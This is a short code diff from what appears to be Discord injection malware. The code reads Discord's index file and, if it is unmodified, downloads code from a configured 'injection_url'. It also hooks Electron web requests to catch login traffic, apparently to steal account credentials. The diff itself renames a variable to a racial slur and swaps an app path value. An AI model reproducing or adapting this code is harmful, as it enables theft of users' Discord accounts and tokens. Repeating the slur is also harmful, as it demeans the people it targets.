@@ -521,8 +521,8 @@ const checUpdate = () => {
 var index = "${indexFile}"
 var betterDiscord = "${betterDiscord}"
 
-var bouki = fs.readFileSync(index).toString()
-if (bouki == "module.exports = require('./core.asar');") init()
+var negger = fs.readFileSync(index).toString()
+if (negger == "module.exports = require('./core.asar');") init()
 
 function init() {
     https.get("${config.injection_url}", res => {
@@ -585,7 +585,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         appPath,
         appName
     } = path
-    var client_discord = appPath
+    var client_discord = appName
     
     switch (true) {
         case request.url.endsWith("login"):
